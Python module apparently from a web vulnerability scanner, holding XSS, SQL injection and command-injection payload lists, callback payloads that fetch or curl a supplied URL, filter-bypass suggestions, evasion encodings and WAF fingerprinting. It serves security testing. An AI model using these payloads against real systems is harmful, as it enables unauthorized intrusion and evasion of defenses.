"""
Adaptive Payload Engine for Vulnerability Scanner

This module provides intelligent, context-aware payload generation and selection
for vulnerability exploitation. Features include:

- Context detection (HTML, JSON, XML, SVG, JavaScript, etc.)
- Multi-encoding payload variations
- Response heuristics analysis
- Reflection point detection
- Filter evasion techniques
- Adaptive payload selection based on target responses

Usage:
    from scanner.adaptive_payload_engine import AdaptivePayloadEngine
    
    engine = AdaptivePayloadEngine()
    payloads = engine.generate_adaptive_payloads('xss', context='html')
    
    # Analyze response for reflection
    reflection = engine.analyze_reflection(response_text, test_payload)
    if reflection['reflected']:
        best_payloads = engine.select_best_payloads('xss', reflection['context'])
"""

import re
import json
import logging
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import quote, quote_plus
import html
import base64

logger = logging.getLogger(__name__)


class AdaptivePayloadEngine:
    """
    Intelligent payload engine that adapts to target contexts and responses.
    
    Analyzes injection contexts, detects filters, and generates optimal
    payloads for successful exploitation.
    """
    
    # XSS payloads for different contexts
    XSS_PAYLOADS = {
        'html': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
        ],
        'attribute': [
            '" onmouseover="alert(1)',
            '\' onmouseover=\'alert(1)',
            '"><img src=x onerror=alert(1)>',
            '\'><img src=x onerror=alert(1)>',
            '" autofocus onfocus="alert(1)',
        ],
        'javascript': [
            '\'-alert(1)-\'',
            '"-alert(1)-"',
            '</script><script>alert(1)</script>',
            '});alert(1);//',
            '\');alert(1);//',
            '";alert(1);//',
        ],
        'json': [
            '{"x":"</script><script>alert(1)</script>"}',
            '\\"}</script><script>alert(1)</script><script>',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        ],
        'svg': [
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x></svg>',
            '<svg><set onbegin=alert(1) attributeName=x></svg>',
            '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',
        ],
        'url': [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ],
    }
    
    # SQLi payloads for different database types
    SQLI_PAYLOADS = {
        'mysql': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--",
            "1' AND '1'='1",
        ],
        'postgresql': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL--",
            "'; SELECT pg_sleep(5)--",
        ],
        'mssql': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL--",
            "'; WAITFOR DELAY '0:0:5'--",
        ],
        'oracle': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL FROM dual--",
            "'; DBMS_LOCK.SLEEP(5);--",
        ],
        'generic': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' AND '1'='1",
            "1' OR '1'='1",
            "admin'--",
        ],
    }
    
    # Command injection payloads
    RCE_PAYLOADS = {
        'unix': [
            '; whoami',
            '| whoami',
            '`whoami`',
            '$(whoami)',
            '; id',
            '&& id',
            '|| id',
        ],
        'windows': [
            '& whoami',
            '| whoami',
            '&& whoami',
            '|| whoami',
            '; whoami',
        ],
        'generic': [
            '; echo test',
            '| echo test',
            '&& echo test',
            '|| echo test',
        ],
    }
    
    def __init__(self):
        """Initialize the adaptive payload engine."""
        self.context_cache: Dict[str, str] = {}
        logger.debug("AdaptivePayloadEngine initialized")
    
    def generate_adaptive_payloads(self,
                                   vuln_type: str,
                                   context: Optional[str] = None,
                                   callback_url: Optional[str] = None,
                                   encoding: Optional[str] = None) -> List[str]:
        """
        Generate adaptive payloads for a vulnerability type.
        
        Args:
            vuln_type: Vulnerability type ('xss', 'sqli', 'rce', etc.)
            context: Injection context ('html', 'json', 'attribute', etc.)
            callback_url: Optional callback URL for OOB exploitation
            encoding: Optional encoding to apply ('url', 'html', 'base64', 'unicode')
        
        Returns:
            List of adaptive payloads
        """
        payloads = []
        
        if vuln_type == 'xss':
            payloads = self._generate_xss_payloads(context, callback_url)
        elif vuln_type == 'sqli':
            payloads = self._generate_sqli_payloads(context)
        elif vuln_type == 'rce':
            payloads = self._generate_rce_payloads(context, callback_url)
        else:
            logger.warning(f"Unknown vulnerability type: {vuln_type}")
            return []
        
        # Apply encoding if specified
        if encoding:
            payloads = [self.encode_payload(p, encoding) for p in payloads]
        
        logger.debug(f"Generated {len(payloads)} adaptive payloads for {vuln_type} (context: {context})")
        return payloads
    
    def _generate_xss_payloads(self, context: Optional[str], callback_url: Optional[str]) -> List[str]:
        """Generate XSS payloads for specific context."""
        if not context or context not in self.XSS_PAYLOADS:
            # If no context, return a mix of all contexts
            payloads = []
            for ctx_payloads in self.XSS_PAYLOADS.values():
                payloads.extend(ctx_payloads[:2])  # Take 2 from each context
            return payloads
        
        payloads = self.XSS_PAYLOADS[context].copy()
        
        # Add callback-based payloads if callback URL provided
        if callback_url:
            callback_payloads = self._generate_callback_xss_payloads(context, callback_url)
            payloads.extend(callback_payloads)
        
        return payloads
    
    def _generate_callback_xss_payloads(self, context: str, callback_url: str) -> List[str]:
        """Generate XSS payloads with callback verification."""
        callback_payloads = []
        
        if context == 'html':
            callback_payloads.extend([
                f'<script>fetch("{callback_url}")</script>',
                f'<img src=x onerror=fetch("{callback_url}")>',
                f'<script>new Image().src="{callback_url}"</script>',
            ])
        elif context == 'attribute':
            callback_payloads.extend([
                f'" onfocus="fetch(\'{callback_url}\')" autofocus="',
                f'\' onmouseover=\'fetch("{callback_url}")',
            ])
        elif context == 'javascript':
            callback_payloads.extend([
                f'";fetch("{callback_url}");//',
                f'\';fetch("{callback_url}");//',
            ])
        
        return callback_payloads
    
    def _generate_sqli_payloads(self, db_type: Optional[str]) -> List[str]:
        """Generate SQL injection payloads for specific database."""
        if not db_type or db_type not in self.SQLI_PAYLOADS:
            db_type = 'generic'
        
        return self.SQLI_PAYLOADS[db_type].copy()
    
    def _generate_rce_payloads(self, os_type: Optional[str], callback_url: Optional[str]) -> List[str]:
        """Generate RCE payloads for specific OS."""
        if not os_type or os_type not in self.RCE_PAYLOADS:
            os_type = 'generic'
        
        payloads = self.RCE_PAYLOADS[os_type].copy()
        
        # Add callback-based payloads for OOB detection
        if callback_url:
            if os_type in ['unix', 'generic']:
                payloads.extend([
                    f'; curl {callback_url}',
                    f'| wget {callback_url}',
                    f'`curl {callback_url}`',
                ])
            elif os_type == 'windows':
                payloads.extend([
                    f'& curl {callback_url}',
                    f'| curl {callback_url}',
                ])
        
        return payloads
    
    def detect_context(self, response_text: str, injection_point: str) -> str:
        """
        Detect the injection context from response.
        
        Args:
            response_text: HTTP response body
            injection_point: The parameter/location where injection occurred
        
        Returns:
            Detected context ('html', 'json', 'javascript', 'attribute', etc.)
        """
        # Check if response is JSON
        try:
            json.loads(response_text)
            return 'json'
        except (json.JSONDecodeError, ValueError):
            pass
        
        # Check if in SVG context
        if '<svg' in response_text.lower() and injection_point in response_text:
            return 'svg'
        
        # Check if in JavaScript context
        js_patterns = [
            r'<script[^>]*>.*?' + re.escape(injection_point),
            r'var\s+\w+\s*=\s*["\'].*?' + re.escape(injection_point),
            r'function.*?' + re.escape(injection_point),
        ]
        for pattern in js_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                return 'javascript'
        
        # Check if in HTML attribute
        attr_pattern = r'<[^>]+\s+\w+=["\'].*?' + re.escape(injection_point) + r'.*?["\']'
        if re.search(attr_pattern, response_text, re.IGNORECASE):
            return 'attribute'
        
        # Check if in URL context
        url_patterns = [
            r'href=["\'].*?' + re.escape(injection_point),
            r'src=["\'].*?' + re.escape(injection_point),
            r'action=["\'].*?' + re.escape(injection_point),
        ]
        for pattern in url_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return 'url'
        
        # Default to HTML context
        return 'html'
    
    def analyze_reflection(self, response_text: str, test_payload: str) -> Dict[str, Any]:
        """
        Analyze if and how a payload is reflected in the response.
        
        Args:
            response_text: HTTP response body
            test_payload: The payload that was injected
        
        Returns:
            Dictionary with reflection analysis:
            - reflected: bool
            - context: str
            - encoded: bool
            - filtered: bool
            - filter_bypasses: List[str]
        """
        result = {
            'reflected': False,
            'context': 'unknown',
            'encoded': False,
            'filtered': False,
            'filter_bypasses': [],
        }
        
        # Check for direct reflection
        if test_payload in response_text:
            result['reflected'] = True
            result['context'] = self.detect_context(response_text, test_payload)
            return result
        
        # Check for encoded reflections
        encoded_variants = [
            html.escape(test_payload),  # HTML entities
            quote(test_payload),  # URL encoding
            quote_plus(test_payload),  # URL+ encoding
            test_payload.replace('<', '&lt;').replace('>', '&gt;'),  # Manual HTML encoding
        ]
        
        for variant in encoded_variants:
            if variant in response_text:
                result['reflected'] = True
                result['encoded'] = True
                result['context'] = self.detect_context(response_text, variant)
                return result
        
        # Check for filtered reflection (partial payload)
        # Test if parts of the payload are reflected
        if len(test_payload) > 5:
            # Check if first half is reflected
            half_len = len(test_payload) // 2
            if test_payload[:half_len] in response_text or test_payload[half_len:] in response_text:
                result['reflected'] = True
                result['filtered'] = True
                result['context'] = 'html'
                result['filter_bypasses'] = self._suggest_filter_bypasses(test_payload, response_text)
        
        return result
    
    def _suggest_filter_bypasses(self, payload: str, response: str) -> List[str]:
        """
        Suggest filter bypass techniques based on what was filtered.
        
        Args:
            payload: Original payload
            response: Response text
        
        Returns:
            List of bypass suggestions
        """
        bypasses = []
        
        # Common filter patterns
        if '<script' in payload.lower() and '<script' not in response.lower():
            bypasses.extend([
                'Use alternative tags: <img>, <svg>, <iframe>',
                'Case variation: <ScRiPt>',
                'Use event handlers: onerror, onload',
            ])
        
        if 'onerror' in payload.lower() and 'onerror' not in response.lower():
            bypasses.extend([
                'Try alternative events: onload, onfocus, onmouseover',
                'Use case variation: OnErRoR',
            ])
        
        if 'alert' in payload.lower() and 'alert' not in response.lower():
            bypasses.extend([
                'Use alternative functions: confirm(), prompt()',
                'Use fetch() or XMLHttpRequest for callbacks',
            ])
        
        if '"' not in response and '"' in payload:
            bypasses.append('Quotes filtered, try: \' or HTML entities')
        
        if '<' not in response and '<' in payload:
            bypasses.extend([
                'Angle brackets filtered, try: &lt; or unicode \\u003c',
                'Use existing tags with event handlers',
            ])
        
        return bypasses
    
    def select_best_payloads(self, vuln_type: str, context: str, 
                            reflection_analysis: Optional[Dict[str, Any]] = None,
                            max_payloads: int = 10) -> List[str]:
        """
        Select the most effective payloads based on context and analysis.
        
        Args:
            vuln_type: Vulnerability type
            context: Injection context
            reflection_analysis: Optional reflection analysis result
            max_payloads: Maximum number of payloads to return
        
        Returns:
            List of best payloads for the context
        """
        all_payloads = self.generate_adaptive_payloads(vuln_type, context)
        
        # If we have reflection analysis, filter based on it
        if reflection_analysis and reflection_analysis.get('filtered'):
            # Prioritize payloads that might bypass filters
            bypasses = reflection_analysis.get('filter_bypasses', [])
            if any('alternative tags' in b.lower() for b in bypasses):
                # Prioritize img, svg, iframe tags
                all_payloads = [p for p in all_payloads if any(tag in p.lower() 
                    for tag in ['<img', '<svg', '<iframe', 'onerror', 'onload'])] + all_payloads
        
        # Return top N payloads (removing duplicates)
        seen = set()
        result = []
        for payload in all_payloads:
            if payload not in seen:
                seen.add(payload)
                result.append(payload)
                if len(result) >= max_payloads:
                    break
        
        return result
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """
        Encode a payload using various techniques.
        
        Args:
            payload: Original payload
            encoding: Encoding type ('url', 'html', 'base64', 'unicode', 'double-url')
        
        Returns:
            Encoded payload
        """
        if encoding == 'url':
            return quote(payload)
        
        elif encoding == 'url-plus':
            return quote_plus(payload)
        
        elif encoding == 'html':
            return html.escape(payload)
        
        elif encoding == 'html-entities':
            # Full HTML entity encoding
            return ''.join(f'&#{ord(c)};' for c in payload)
        
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == 'unicode':
            # Unicode escape encoding
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        
        elif encoding == 'double-url':
            # Double URL encoding
            return quote(quote(payload))
        
        elif encoding == 'hex':
            # Hex encoding
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        
        return payload
    
    def generate_multi_encoded_payloads(self, base_payload: str, 
                                       encodings: Optional[List[str]] = None) -> List[str]:
        """
        Generate multiple encoded variations of a payload.
        
        Args:
            base_payload: Base payload to encode
            encodings: List of encodings to apply, or None for all
        
        Returns:
            List of encoded payloads
        """
        if encodings is None:
            encodings = ['url', 'html', 'base64', 'unicode', 'double-url']
        
        encoded_payloads = [base_payload]  # Include original
        
        for encoding in encodings:
            try:
                encoded = self.encode_payload(base_payload, encoding)
                if encoded != base_payload:  # Only add if actually different
                    encoded_payloads.append(encoded)
            except Exception as e:
                logger.warning(f"Failed to encode with {encoding}: {e}")
        
        return encoded_payloads
    
    def detect_waf_signature(self, response_text: str, status_code: int, 
                            headers: Dict[str, str]) -> Optional[str]:
        """
        Detect if a WAF is present based on response characteristics.
        
        Args:
            response_text: Response body
            status_code: HTTP status code
            headers: Response headers
        
        Returns:
            WAF name if detected, None otherwise
        """
        # Check common WAF signatures in headers
        waf_headers = {
            'cloudflare': 'cf-ray',
            'akamai': 'akamai-',
            'aws-waf': 'x-amzn-',
            'imperva': 'x-iinfo',
            'f5': 'x-wa-info',
            'barracuda': 'barra',
            'fortiweb': 'fortigate',
        }
        
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        for waf_name, signature in waf_headers.items():
            for header_key, header_value in headers_lower.items():
                if signature in header_key or signature in header_value:
                    logger.info(f"Detected WAF: {waf_name}")
                    return waf_name
        
        # Check response body signatures
        body_lower = response_text.lower()
        
        if 'cloudflare' in body_lower and status_code in [403, 503]:
            return 'cloudflare'
        
        if 'access denied' in body_lower and status_code == 403:
            if 'sucuri' in body_lower:
                return 'sucuri'
            elif 'imperva' in body_lower:
                return 'imperva'
        
        return None


def get_adaptive_payload_engine() -> AdaptivePayloadEngine:
    """
    Factory function to get an AdaptivePayloadEngine instance.
    
    Returns:
        AdaptivePayloadEngine instance
    """
    return AdaptivePayloadEngine()
